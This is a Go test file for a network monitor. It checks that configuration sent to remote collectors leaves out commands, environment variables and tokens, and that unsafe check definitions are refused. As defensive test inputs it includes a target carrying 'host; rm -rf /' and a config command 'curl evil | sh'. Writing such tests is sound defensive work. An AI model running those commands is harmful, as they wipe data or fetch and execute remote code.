package model

import (
	"reflect"
	"strings"
	"testing"
)

// Every field of CheckConfig has to be either handed to a collector or
// deliberately kept back. A field added later fails this test until someone
// puts it in one list or the other, which is the point: what leaves this
// server for another machine is a decision, not a default.
func TestForCollectorClassifiesEveryField(t *testing.T) {
	kept := map[string]bool{
		"Target": true, "PingCount": true, "PingMethod": true,
		"Method": true, "ExpectedStatus": true, "FollowRedirects": true, "Headers": true, "Body": true,
		"IgnoreTLSErrors": true, "Keyword": true, "KeywordAbsent": true, "JSONPath": true, "JSONExpected": true,
		"CertWarnDays": true, "CertCheck": true, "ContentWatch": true, "ContentHeader": true,
		"JSONRecord": true, "JSONMetric": true, "JSONUnit": true,
		"JSONWarnAbove": true, "JSONCritAbove": true, "JSONWarnBelow": true, "JSONCritBelow": true,
		"Port": true, "ExpectedIPs": true, "DNSServer": true, "RecordType": true,
		"LatencyWarnMS": true, "PacketLossWarnPct": true,
		"SNMPVersion": true, "SNMPPort": true, "SNMPCommunity": true, "SNMPUser": true, "SNMPAuthProto": true,
		"SNMPAuthPass": true, "SNMPPrivProto": true, "SNMPPrivPass": true, "SNMPOIDs": true,
	}
	withheld := map[string]bool{
		"Groups": true, "Command": true, "WorkDir": true, "Env": true,
		"HostSource": true, "AgentID": true, "MetricsURL": true, "MetricsToken": true,
		"MetricThresholds": true, "DiskMounts": true,
		"CPUWarnPct": true, "CPUCritPct": true, "MemWarnPct": true, "MemCritPct": true, "SwapWarnPct": true,
		"DiskWarnPct": true, "DiskCritPct": true, "LoadWarnPerCore": true, "LoadCritPerCore": true,
		"StaleAfterSeconds": true,
		"MatterServer":      true, "MatterNodeID": true, "MatterReadings": true,
	}
	// Fill every field with something, run it through, and see what survives.
	var full CheckConfig
	v := reflect.ValueOf(&full).Elem()
	for i := 0; i < v.NumField(); i++ {
		fillField(v.Field(i))
	}
	out := reflect.ValueOf(full.ForCollector())
	typ := v.Type()
	for i := 0; i < typ.NumField(); i++ {
		name := typ.Field(i).Name
		survived := !out.Field(i).IsZero()
		switch {
		case kept[name] && !survived:
			t.Errorf("%s is meant to reach a collector and does not", name)
		case withheld[name] && survived:
			t.Errorf("%s reached a collector and must not", name)
		case !kept[name] && !withheld[name]:
			t.Errorf("CheckConfig.%s is new: decide in ForCollector whether a collector needs it, and list it here", name)
		}
	}
}

func fillField(f reflect.Value) {
	switch f.Kind() {
	case reflect.String:
		f.SetString("x")
	case reflect.Int, reflect.Int64:
		f.SetInt(1)
	case reflect.Uint64:
		f.SetUint(1)
	case reflect.Float64:
		f.SetFloat(1)
	case reflect.Bool:
		f.SetBool(true)
	case reflect.Ptr:
		p := reflect.New(f.Type().Elem())
		fillField(p.Elem())
		f.Set(p)
	case reflect.Slice:
		s := reflect.MakeSlice(f.Type(), 1, 1)
		fillField(s.Index(0))
		f.Set(s)
	case reflect.Map:
		m := reflect.MakeMap(f.Type())
		m.SetMapIndex(reflect.ValueOf("k"), reflect.ValueOf("v"))
		f.Set(m)
	case reflect.Struct:
		for i := 0; i < f.NumField(); i++ {
			fillField(f.Field(i))
		}
	}
}

func TestCollectableTypes(t *testing.T) {
	for _, ty := range []CheckType{CheckCustom, CheckSystem, CheckMatter, "shell"} {
		if ty.Collectable() {
			t.Errorf("%s must never be run by a collector", ty)
		}
	}
	for _, ty := range []CheckType{CheckPing, CheckTCP, CheckHTTP, CheckDNS, CheckSNMP} {
		if !ty.Collectable() {
			t.Errorf("%s should be collectable", ty)
		}
	}
}

func TestCollectorCheckValidate(t *testing.T) {
	good := CollectorCheck{ID: 1, Type: CheckPing, Target: "10.0.0.1", IntervalSeconds: 60, TimeoutSeconds: 5}
	if err := good.Validate(); err != nil {
		t.Fatalf("a plain ping was refused: %v", err)
	}
	for name, mutate := range map[string]func(*CollectorCheck){
		"custom type":   func(c *CollectorCheck) { c.Type = CheckCustom },
		"system type":   func(c *CollectorCheck) { c.Type = CheckSystem },
		"no target":     func(c *CollectorCheck) { c.Target = " " },
		"shell target":  func(c *CollectorCheck) { c.Target = "host; rm -rf /" },
		"newline":       func(c *CollectorCheck) { c.Target = "a\nb" },
		"tiny interval": func(c *CollectorCheck) { c.IntervalSeconds = 1 },
		"no id":         func(c *CollectorCheck) { c.ID = 0 },
		"huge retries":  func(c *CollectorCheck) { c.Retries = 99 },
	} {
		c := good
		mutate(&c)
		if err := c.Validate(); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

// A definition that somehow arrives carrying a command runs without it.
func TestCollectorCheckDropsWhatItShouldNotCarry(t *testing.T) {
	cc := CollectorCheck{ID: 3, Type: CheckHTTP, Target: " https://x.lan ", IntervalSeconds: 60,
		Config: CheckConfig{Command: "curl evil | sh", Env: map[string]string{"A": "b"}, MetricsToken: "t", Headers: map[string]string{"Authorization": "Bearer k"}}}
	c := cc.Check()
	if c.Config.Command != "" || c.Config.Env != nil || c.Config.MetricsToken != "" {
		t.Fatalf("withheld settings came through: %+v", c.Config)
	}
	if c.Config.Headers["Authorization"] != "Bearer k" || c.Config.Target != "https://x.lan" {
		t.Fatalf("the settings the check needs were lost: %+v", c.Config)
	}
}

func TestCollectorFor(t *testing.T) {
	id := int64(7)
	n := Node{CollectorID: &id}
	if got, ok := n.CollectorFor(Check{Type: CheckTCP}); !ok || got != 7 {
		t.Fatal("a TCP check of a collected node should be the collector's")
	}
	if _, ok := n.CollectorFor(Check{Type: CheckCustom}); ok {
		t.Fatal("a script check stays on the server")
	}
	if _, ok := (Node{}).CollectorFor(Check{Type: CheckPing}); ok {
		t.Fatal("a node with no collector checks from here")
	}
	if !strings.Contains(string(EventCollectorDown), "collector") {
		t.Fatal("event type renamed")
	}
}
